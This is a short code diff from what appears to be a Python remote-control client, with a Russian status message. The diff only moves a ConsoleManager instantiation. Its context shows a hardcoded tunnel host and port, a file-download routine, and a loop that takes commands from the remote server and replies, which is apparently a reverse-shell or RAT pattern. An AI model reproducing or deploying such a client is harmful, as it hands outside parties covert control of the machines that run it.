@@ -5,6 +5,7 @@ import time
 from modules import main as m
 
 HOST, PORT = 'est-wood.gl.at.ply.gg', 19355
+con = m.ConsoleManager()
 
 def download(s):
     header = s.recv(1024).decode('utf-8').strip()
@@ -61,8 +62,6 @@ def connect_to_server(HOST, PORT):
 def execute_commands(s):
     while True:
         try:
-            con = m.ConsoleManager()
-
             print(f"<-+-> Подключение к серверу установлено.")
             command = s.recv(24576).decode('utf-8')
             s.send(b'<-+-> Answered')
